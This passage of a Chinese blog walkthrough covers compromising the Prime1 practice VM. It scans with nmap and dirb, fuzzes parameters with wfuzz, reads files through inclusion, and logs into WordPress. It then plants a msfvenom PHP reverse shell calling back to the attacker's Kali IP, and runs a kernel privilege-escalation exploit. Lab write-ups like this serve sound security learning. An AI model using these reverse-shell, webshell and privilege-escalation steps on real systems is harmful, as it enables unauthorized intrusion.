alt="image-20221103141649097"></p><p>可以看到，同网段扫到了四个机子，一般*.1*是自己的物理机，太小太大的都不考虑，就剩128和145了，而128是我Kali的IP，所以剩下的145就是靶机的IP了。</p><p>要是觉得上面的方法靠猜测不妥，凭什么要排除太大和太小的IP啊是吧？这里给出另外一种方法。</p><p>刚刚扫一遍，得到4个存活的IP，这时候把靶机给关了，再扫描一遍C段，应该只有三个了，第二次消失的那一个，就是靶机的IP了。</p><p>那找到IP之后，我们要登录这个系统，有什么办法可以找到密码呢？</p><h1 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h1><p>拿到IP之后，可以继续扫描，这个IP开放了哪些端口，都运行着什么服务，也许就能找到突破口呢。</p><p>继续<strong>用Nmap扫全端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.120.145</span><br></pre></td></tr></table></figure><blockquote><p>这里通过-p参数指定全端口，不指定的话，只会扫描常用端口</p></blockquote><p><img src="/img/image-20221103143407496.png" alt="image-20221103143407496"></p><p>扫到2个端口，22和80，对应的服务，也写出来了</p><blockquote><p>如果扫出来的端口比较陌生，不知道运行着什么服务，可以百度查询</p><p>这里给出一份<a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">常用的端口对应的服务</a></p></blockquote><p>22端口是SSH服务，无非就是用Xshell去连接，没啥突破口。</p><p>80端口开放的是HTTP服务，也就是有Web服务啊！！！那不开整？</p><h1 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h1><p>用浏览器打开上面开放的80端口</p><p><strong>访问网址</strong>：IP:port，我这里就是192.168.120.145:80（其实直接输入ip就可以访问了，应为HTTP协议默认就是80端口）</p><p><img src="/img/image-20221103144324733.png" alt="image-20221103144324733"></p><p>嗯？？这什么情况？？WTF？？？就一张图片？？？玩呢？？</p><p>冷静冷静哈！思考下，遇到就一张图片，有什么思路可以进行下去？</p><ul><li>CMS指纹识别</li><li>Ctrl+U查看前端源码</li><li>目录扫描</li></ul><p>思路列出来了，一个个尝试吧</p><p>CMS指纹识别，壮烈牺牲</p><p><img src="/img/image-20221103144853909.png" alt="image-20221103144853909"></p><p>emmm源码就。。。算了吧</p><p><img src="/img/image-20221103145005398.png" alt="image-20221103145005398"></p><p>那就只有<strong>目录扫描</strong>了</p><p>问题是怎么扫呢？用啥工具呢？</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>工具</p><ul><li>dirb</li><li>御剑</li><li>webscan</li><li>gobuster</li><li>dirsearch</li><li>BurpSuite</li><li>………（工具很多）</li></ul><p>我打开dirb就是一顿扫（kali自带dirb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145</span><br></pre></td></tr></table></figure><p>啊嘞？还有工具连-u都不要加的？不管，看结果</p><p><img src="/img/image-20221103160653117.png" alt="image-20221103160653117"></p><p>扫出了一个WordPress，一看就知道，这是个个人博客。</p><p>打开看看，果然！有没有发现这个victor有点似曾相识？？</p><p><img src="/img/image-20221103160539432.png" alt="image-20221103160539432"></p><p>嘚，白高兴一场，啥也没有发现。</p><p>接下来又看了看扫出来的其他目录，全是WordPress的大概看了下，这条路肝不下去了。</p><p>只能想想有没有其他办法。密码有没有可能存在一个文件里？首先想到的就是txt，接着我又用dirb对txt后缀的来了一顿扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .txt</span><br></pre></td></tr></table></figure><p>欸？？？这是啥？<code>secret.txt</code>？？？赶紧打开看看</p><p><img src="/img/image-20221103161740535.png" alt="image-20221103161740535"></p><p>果然有东西啊！！（Prime1：看你太菜了给你点提示吧）</p><p><img src="/img/image-20221103161920266.png" alt="image-20221103161920266"></p><p>整段翻译如下</p><blockquote><p>小伙子有点东西啊！</p><p>但还是菜了点哟！给你点提示：</p><p><strong>对你发现的每一页php做一些Fuzz，如果Fuzz到了正确的参数，然后照着下面的步骤做</strong></p><p><strong>查看<code>location.txt</code>，你就知道下一步该怎么走了。</strong></p><p>如果你还是菜的不行，来<a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">我们网站</a>学习一下基本工具的使用</p></blockquote><p>我不管，我才不要等下再用这个提示，我就是要现在就访问<code>location.txt</code>，不然我不甘心</p><p><img src="/img/image-20221103162840784.png" alt="image-20221103162840784"></p><p>甘心了，，，对不起打扰了！</p><h2 id="Fuzz参数"><a href="#Fuzz参数" class="headerlink" title="Fuzz参数"></a>Fuzz参数</h2><p>既然上面提到php，那就先扫一下有哪些php，再针对每个php做Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .php</span><br></pre></td></tr></table></figure><p>就扫出来这俩</p><p><img src="/img/image-20221103163102067.png" alt="image-20221103163102067"></p><p><strong>激动人心的Fuzz</strong></p><p>问题来了，Fuzz是个啥？不懂的来看看<a href="https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962?fr=aladdin">度娘的解释</a></p><p>看懂了么？我唬你呢！看了比没看还模糊了是吧哈哈哈</p><p>我这里用我自己的浅显理解来解释一下Fuzz</p><blockquote><p>Fuzz即<strong>模糊测试</strong></p><p>就是瞎鸡儿乱猜的意思</p><p>用上面的例子来说，要你Fuzz参数，那参数是个啥样子？get请求下就是<a href="http://192.168.120.145/index.php?%E5%8F%82%E6%95%B0=xxx">http://192.168.120.145/index.php?参数=xxx</a></p><p>至于参数是啥，我不知道啊，那我就只能乱猜，万一瞎猫碰上死耗子，给我猜对了呢？</p><p>Fuzz就是这样，不看技术，全看运气，谁也不知道到底能不能猜对</p></blockquote><p>工具随便哈，很多工具都可以做Fuzz（BP就可以）</p><p>我这里选择直接用kali里面自带的工具<code>wfuzz</code>和自带的字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221103170429320.png" alt="image-20221103170429320"></p><p>这里解释下这几列的含义</p><ul><li>ID：就id，没啥别的意思</li><li>Response：HTTP请求返回的状态码</li><li>Lines：返回包的行数</li><li>Word：单词个数</li><li>Chars：字符个数</li><li>Payload：Fuzz的参数</li></ul><p>上面字典返回了900多条数据，那怎么找那些可能是正确的参数呢？思路是与大部分不同的一般就有蹊跷，因为大部分参数是错的，那正确的势必返回的就不一样。</p><p>Burp爆破的话，直接点一下排序就看出来了，这个破工具还要用命令行重新执行命令来排序，我真的会谢！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看看参数，看有啥可以用的</span></span><br><span class="line">wfuzz -h</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用参数过滤</span></span><br><span class="line">--hc# 过滤掉某个响应状态</span><br><span class="line">--hl# 过滤掉响应为x行的</span><br><span class="line">--hw# 过滤掉响应为x个单词的</span><br><span class="line">--hh# 过滤掉响应为x个字符的</span><br></pre></td></tr></table></figure><p>我这里随便选个过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hl 7 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p>结果是：糟糕！裤衩子都过滤没了</p><p><img src="/img/image-20221103172027133.png" alt="image-20221103172027133"></p><p>那就只能换个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hw 12 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><h2 id="得到index-php的参数"><a href="#得到index-php的参数" class="headerlink" title="得到index.php的参数"></a>得到index.php的参数</h2><p>有东西啊！</p><p><img src="/img/image-20221103172145627.png" alt="image-20221103172145627"></p><p>还记得上面<code>secret.txt</code>里面的提示吗？记不记得有个<code>location.txt</code>？</p><p>还有扫出来的两个php文件：<code>image.php</code>和<code>index.php</code></p><p>现在用这个Fuzz出来的参数试试吧！</p><p><code>image.php</code>没变化</p><p><img src="/img/image-20221103183545155.png" alt="image-20221103183545155"></p><p><code>index.php</code>出现了点不一样的东西，多了些文字</p><p><img src="/img/image-20221103172359891.png" alt="image-20221103172359891"></p><p>翻译</p><blockquote><p>小伙子不错啊！</p><p>现在你知道正确的参数了</p><p><strong>用<code>secrettier360</code>参数去尝试其他的php页面吧！</strong></p></blockquote><h2 id="得到iamge-php的参数"><a href="#得到iamge-php的参数" class="headerlink" title="得到iamge.php的参数"></a>得到iamge.php的参数</h2><p>这时，把上面没变化的<code>image.php</code>按照提示的参数试一试</p><p><img src="/img/image-20221103184200350.png" alt="image-20221103184200350"></p><p>好的，你得到了正确的参数</p><h2 id="password-txt"><a href="#password-txt" class="headerlink" title="password.txt"></a>password.txt</h2><p>然后呢，就一句话就没了？？？思路好像又断了，继续往下想想，既然给了file让我们来读取文件，那我们可不可以去读取一些敏感文件呢？说干就干！</p><p>然而，emmmmmm…….又断了，系统提示挖错文件了</p><p><img src="/img/image-20221103184903209.png" alt="image-20221103184903209"></p><p>试试另外一个，居然成了，好吧我装的，因为我去看了视频。</p><p>我一直在试前面那个<code>index.php</code>的参数，反而忽视了靶场一步步把我们引到到<code>image.php</code>，还给了正确的参数。</p><p><img src="/img/image-20221103185510097.png" alt="image-20221103185510097"></p><p>接下来就顺着给出的提示，我尝试直接读取password.txt，没有结果</p><p>看了一眼上面的提示，Find <strong>password.txt</strong> in <strong>my directory</strong></p><p>分析主要的突破点是要知道提示所说的<strong>my directory</strong>是指的哪一个目录，想到Linux下，每一个用户都有一个home目录，用户名是victor，接下来我们就来验证这条猜想</p><p><img src="/img/image-20221103190414091.png" alt="image-20221103190414091"></p><p>还是那句话，空空如也，我C他NN的！！！</p><p>这时候，我又去看了一眼上面的截图，就在我画框的后面，就有路径啊！！！我顺着那个路径找过去，出来了！还是我太菜了，Linux基础学的不好，才去分析上面那一堆有的没的。</p><p><img src="/img/image-20221103190658299.png" alt="image-20221103190658299"></p><h2 id="登录WordPress"><a href="#登录WordPress" class="headerlink" title="登录WordPress"></a>登录WordPress</h2><p>当时看到这串字符的时候，我第一反应是有点懵，要我关注ippsec？？？这是啥意思，过了一会才反应过来，这有没有可能就是密码啊？而且这是password.txt欸？</p><p>拿着这串字符去试着登录了一下victor用户，喜提”密码错误“💔💔💔</p><p><img src="/img/image-20221103190941126.png" alt="image-20221103190941126"></p><p>到这，我又不知道怎么办了。</p><p>去看了下视频的提示：<strong>这到底是什么的密码？</strong></p><p>于是我想起，之前端口扫描的时候，有个22端口，猜测有可能是<strong>SSH</strong>的密码，我马上打开我的XShell。</p><p>哈哈，没连上mad❗</p><p>然后我又想，还有啥密码？前面好像还有个WordPress博客，去试试看，也许就是这个呢？然后我往上翻了下之前目录扫描的截图，进到了<a href="http://192.168.120.145/wordpress/wp-admin%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%88%B0wordpress%E7%9A%84%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2">http://192.168.120.145/wordpress/wp-admin，然后跳转到wordpress的登陆界面</a></p><p><img src="/img/image-20221103225332819.png" alt="image-20221103225332819"></p><p>用户名当然是猜的victor，因为之前看过这个博客首页，加上靶机上的登录用户名也是victor，密码输入follow_the_ippsec，点登录</p><blockquote><p>后面了解到，WordPress在搭建成功后会自动生成一篇博客，用户名就是管理员的用户名</p><p>还有Kali自带的工具<code>cmseek</code>和<code>wpscan</code>可以去扫描WordPress站点的用户名和漏洞，以及其他信息</p></blockquote><p>在几秒的转圈圈之后，进去了！！！</p><p><img src="/img/image-20221103225535739.png" alt="image-20221103225535739"></p><p>找了一圈，没发现什么信息。唯一发现了一个邮箱，我还用这个邮箱去试了一下密码，不对，作罢！</p><p>又开始偷思路😂😂😂</p><h2 id="WordPress主题编辑"><a href="#WordPress主题编辑" class="headerlink" title="WordPress主题编辑"></a>WordPress主题编辑</h2><p>了解到【Appearance】的【Theme Editer】可以编辑主题，里面存在部分php可以被编辑，php哦！！！还是可以编辑的，那不直接一句话木马开搞？？？</p><p><img src="/img/image-20221103231333565.png" alt="image-20221103231333565"></p><p>接下来就是去找可以编辑的，连着点了好多个，都是这种不能修改的</p><p><img src="/img/image-20221103231930552.png" alt="image-20221103231930552"></p><p>皇天不负有心人！终于找到一个能改的</p><p><img src="/img/image-20221103232115455.png" alt="image-20221103232115455"></p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>直接开整！！！等啥呀？</p><p><img src="/img/image-20221103232359755.png" alt="image-20221103232359755"></p><p>上传成功！nice！好了，就等着我拿下你吧小卡拉米！</p><p>高高兴兴掏出我的蚁剑</p><p><img src="/img/image-20221104100447856.png" alt="image-20221104100447856"></p><p>好了，问题来了，我这个URL要怎么填？WordPress的后台编辑那里的url是<a href="http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen%EF%BC%8C%E8%BF%99%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%B8%8D%E8%A1%8C%E5%95%8A%EF%BC%8C%E6%88%91%E8%A6%81%E6%89%BE%E5%88%B0secret.php%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84%E6%89%8D%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%AF%B9WordPress%E4%B8%8D%E7%86%9F%E6%82%89%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%8C%9C%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84%E3%80%82">http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen，这一看就不行啊，我要找到secret.php的真实路径才行，但是我对WordPress不熟悉，不知道怎么猜这个路径。</a></p><h2 id="确定路径"><a href="#确定路径" class="headerlink" title="确定路径"></a>确定路径</h2><p>我知道WordPress是开源的，于是我上<a href="https://core.trac.wordpress.org/browser/#branches/5.2/src/wp-admin/includes">WordPress官网</a>下了一份5.2版本的源码（<strong>Dashboard</strong>往下划，<strong>At a Glance</strong>板块可以看到WordPress的版本和使用的主题）</p><p><img src="/img/image-20221104110916788.png" alt="image-20221104110916788"></p><p>然后就顺着这个线索，结合上面修改页面右侧的文件结构，在源码里找到了这个路径</p><p><img src="/img/image-20221104111036384.png" alt="image-20221104111036384"></p><p><img src="/img/image-20221104111310256.png" alt="image-20221104111310256"></p><p>接下来我就按照这个路径，用蚁剑去连了。</p><p>直接红一片我也是没想到</p><p><img src="/img/image-20221104111549931.png" alt="image-20221104111549931"></p><p>然后我又去浏览器访问这个网址</p><p><img src="/img/image-20221104111657882.png" alt="image-20221104111657882"></p><p>返回404，意思就是secret.php不在这个路径</p><p>到这里，思路又断了（真的太菜了）</p><p>继续偷思路（emm这叫借鉴！！）</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>了解到可以<strong>反弹shell</strong>，其实之前一直知道这个概念，但是没有实战过，所以也不知道什么时候该用，怎么用。这次真的是学到了！</p><p>继续用我浅显的理解来解释一下<strong>反弹shell</strong></p><blockquote><p>首先要明确：<strong>反弹shell</strong>和<strong>一句话木马</strong>的目的都是一样的，就是<strong>为了拿shell</strong></p><p>区别在于</p><ul><li>一句话木马：上传之后，你得主动用WebShell管理工具之类的东西去连他，连上了才可以</li><li>反弹shell：让<strong>它主动来连你</strong></li></ul><p>这有啥不一样呢？为啥一定要它来连你呢？你连他为啥又不行呢？</p><p>想象一下，你去别的学校找朋友玩泥巴，但是他们学校只允许本校师生进出，不允许外面的人进出。这时候，你们想见面一起玩泥巴，那就只能让他出来找你，因为门卫不让你进去找他啊！！（说翻墙钻狗洞进去的小伙子，你真是个大聪明🤡）</p><p>一样的意思，当一台机子处于<strong>内网、动态IP</strong>，或者<strong>配置了防火墙、杀毒软件</strong>，那很可能，你是没有办法去连接它的，只能让它出来连你，这就是<strong>反弹shell</strong></p></blockquote><h3 id="生成php反弹shell代码"><a href="#生成php反弹shell代码" class="headerlink" title="生成php反弹shell代码"></a>生成php反弹shell代码</h3><p>现在，用我们的<em><strong>美少妇（MSF）</strong></em>来生成php反弹shell的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.120.128 lport=6666 -o shell.php</span><br></pre></td></tr></table></figure><blockquote><p>这句话的意思是让msfvenom的php&#x2F;meterpreter&#x2F;reverse_tcp模块来生成反弹shell的脚本，设置让靶机来连Kali（IP:192.168.120.128）的6666端口，保存为<code>shell.php</code></p></blockquote><p><img src="/img/image-20221104133526200.png" alt="image-20221104133526200"></p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>把生成的代码粘贴到<code>secret.php</code>里面（粘贴我上面黑色的那一坨，前面俩不要粘上去了），保存</p><p><img src="/img/image-20221104134106090.png" alt="image-20221104134106090"></p><h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p>接下来，就是监听了</p><blockquote><p>为啥要监听？</p><p>接着上面的例子说哈，你朋友都出校门来找你玩泥巴来了，你不得蹲在门口等他吗？不然你怎么知道他出来了呢？只能蹲在门口守着呗。</p><p>这也是一样的，你让靶机来连你，你不监听那个端口，你咋知道它来连你那个端口了？</p></blockquote><p>那我们用啥来监听呢？<del>当然是亲自蹲在电脑显示器上呗</del>（bushi）</p><p>当然是用工具来监听啦~可用的工具有很多，这里推荐<code>nc</code>和<code>msfconsole</code></p><p>这里用msfconsole（因为它给我比心❤）</p><ol><li>命令行输入<code>msfconsole</code>，启动美少妇</li></ol><p><img src="/img/image-20221104134918991.png" alt="image-20221104134918991"></p><ol start="2"><li>使用监听模块</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221104135312786.png" alt="image-20221104135312786"></p><ol start="3"><li>告诉它，你在等待一个php的反弹来连你</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里的模块和上面使用msfvenom生成反弹shell的模块是一样的</span></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ol start="4"><li>指定监听的IP和端口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.120.128</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure><ol start="5"><li>启动监听</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任选一个执行，效果是一样的</span></span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>监听就准备好啦~接下来的问题是</p><p><strong>靶机什么时候来连我们呢？</strong></p><p>这就得你去提醒一下它，让他来连你，这时候我突然发现，我上面费大劲找的<code>secret.php</code>路径，这时候用得到了！！！</p><p>访问<a href="http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php</a></p><p><img src="/img/image-20221104140546616.png" alt="image-20221104140546616"></p><p>页面虽然一直在加载，这时候打开我们的Kali看看，已经进入到meterpreter了！！！就是已经反弹连接上了，我们已经拿到靶机的shell了。</p><p>执行命令看看，没问题！</p><p><img src="/img/image-20221104155213895.png" alt="image-20221104155213895"></p><blockquote><p>注意：</p><p>我们此时拿到的shell环境，并不是root用户，meterpreter并不能执行所有的命令</p></blockquote><h1 id="内核提权【适用于Ubuntu-4-10】"><a href="#内核提权【适用于Ubuntu-4-10】" class="headerlink" title="内核提权【适用于Ubuntu 4.10】"></a>内核提权【适用于Ubuntu 4.10】</h1><p>上面我们拿到了靶机的Linux版本，用msfconsole看看有没有能提权的模块</p><blockquote><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<em>不要在meterpreter下直接执行，新开一个Terminal，进入msfconsole里面执行</em></p><p>或者使用<code>background</code>回退到msf的界面，记住返回的<code>session</code>为1，到时候直接通过<code>sessions 1</code>回到meterpreter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 16.04 Ubuntu</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221104171340983.png" alt="image-20221104171340983"></p><p>使用其中符合条件的<em><strong>linux&#x2F;local&#x2F;45010.c</strong></em></p><blockquote><p>用来提权到root，用C语言编写其路径为&#x2F;usr&#x2F;share&#x2F;exploits&#x2F;local&#x2F;45010.c</p></blockquote><ol><li>将该文件拷贝到当前目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</span><br></pre></td></tr></table></figure><ol start="2"><li>用<code>gcc</code>编译该文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>用meterpreter</strong>把上面生成的<code>45010</code>移动到靶机里面（<strong>此步骤在meterpreter里面执行！！！</strong>）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/slipper/45010 /tmp</span><br></pre></td></tr></table></figure><blockquote><p>本句的意思是：把本机<code>home/slipper/45010</code>上传到靶机的<code>/tmp</code>目录</p></blockquote><ol start="4"><li>进入shell，给<code>45010</code>添加可执行的权限</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3108 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时已经进入到靶机的shell环境</span></span><br><span class="line">pwd# 查看当前目录</span><br><span class="line">/tmp</span><br><span class="line">chmod +x 45010# 添加执行权限</span><br><span class="line">./45010# 执行该提权程序</span><br></pre></td></tr></table></figure><p>这时候已经提权成功了</p><h1 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h1><p>&#x3D;&#x3D;实际上，我的提权失败了&#x3D;&#x3D;</p><p>按理来说，是可以成功的，但是我当时没弄完就去做其他的事情，第二天再来弄的时候，我的靶机IP变了，从145变成147了。我当时觉得奇怪，因为我虚拟机Kali的IP一直就没变过，为什么这个突然变了。当时没有在意，直到我使用上述方法，屡次提权失败</p><p>于是，我几乎翻遍了网上关于Prime1这个靶机的记录，终于看到一句话：</p><p>&#x3D;&#x3D;有些情况我们下载的靶机的版本并不是Ubuntu4.10而是Ubuntu 4.15，就不能通过45010这个复现成功&#x3D;&#x3D;</p><p>但是我明明记得我是4.10。然后，我就又去看了一下我Ubuntu靶机的版本信息</p><p><img src="/img/image-20221105150754154.png" alt="image-20221105150754154"></p><p>&#x3D;&#x3D;我的Ubuntu居然自动升级了！&#x3D;&#x3D;</p><p>可以往上看我当时的截图，当时的版本是4.10的，一觉起来，Ubuntu靶机给我自动升级成4.15了，估计也是这个原因，导致靶机的IP发生了变化。</p><p>而此时，4.15版本的已经不能使用上述方法提权了。我用msf搜索了升级之后的版本还有没有可以用的提权代码，已经🈚了，所以靠nday提权已经行不通了，靶机的设计者的目的并不是想让我们靠提权来拿到Flag，而是像上面一样，一层层的剥开，找到密码。</p><blockquote><p>这个问题真的折磨了我很久，第一次遇到这种骚操作</p></blockquote><h1 id="提权【适用于Ubuntu-4-15】"><a href="#提权【适用于Ubuntu-4-15】" class="headerlink" title="提权【适用于Ubuntu 4.15】"></a><strong>提权【适用于Ubuntu 4.15】</strong></h1><ol><li>进入shell环境</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br></pre></td></tr></table></figure><ol start="2"><li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule">将shell升级到完全交互式的TTY</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看当前用户可以用 sudo 执行哪些命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105153916471.png" alt="image-20221105153916471"></p><p>这里的<code>/home/saket/enc</code>引起了注意，它是一个可执行文件，执行需要输入密码，使用<code>follow_the_ippsec</code>发现不对</p><h2 id="backup文件"><a href="#backup文件" class="headerlink" title="backup文件"></a>backup文件</h2><p>在<code>/opt</code>目录下发现<code>backup</code>文件夹，最终发现了<code>可执行文件enc</code>的密码为<code>backup_password</code></p><p><img src="/img/image-20221105154613484.png" alt="image-20221105154613484"></p><ol start="4"><li>执行<code>enc</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/saket</span><br><span class="line">./enc</span><br></pre></td></tr></table></figure><ol start="5"><li>此时发现<code>/home/saket</code>目录下多了两个文件：<code>enc.txt</code>和<code>key.txt</code></li></ol><p><img src="/img/image-20221105155104206.png" alt="image-20221105155104206"></p><p>得到了一串字符和一条提示，看样子应该是base64编码的</p><ol start="6"><li>使用<a href="https://www.cmd5.com/">cmd5</a>加密<code>ippsec</code></li></ol><p><img src="/img/image-20221105155927773.png" alt="image-20221105155927773"></p><p>得到</p><p>md5(ippsec,32) &#x3D; 366a74cb3c959de17d61db30591c39d1<br>md5(ippsec,16) &#x3D; 3c959de17d61db30</p><ol start="7"><li>使用<a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES Encryption and Decryption Online Tool</a>解密<code>enc.txt</code></li></ol><p><img src="/img/image-20221105161448956.png" alt="image-20221105161448956"></p><p>解密结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw=</span><br></pre></td></tr></table></figure><ol start="8"><li>对上面的字符串进行<a href="https://tool.chinaz.com/tools/base64.aspx">Base64解码</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,</span><br></pre></td></tr></table></figure><p>得到了密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tribute_to_ippsec</span><br></pre></td></tr></table></figure><h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105162115763.png" alt="image-20221105162115763"></p><ul><li>查看saket用户可用sudo执行的命令</li></ul><p><img src="/img/image-20221105165526516.png" alt="image-20221105165526516"></p><ul><li>跟进到&#x2F;home&#x2F;victor&#x2F;undefeated_victor</li></ul><p><img src="/img/image-20221105165644625.png" alt="image-20221105165644625"></p><p>提示<code>/tmp/challenge</code> not found</p><h2 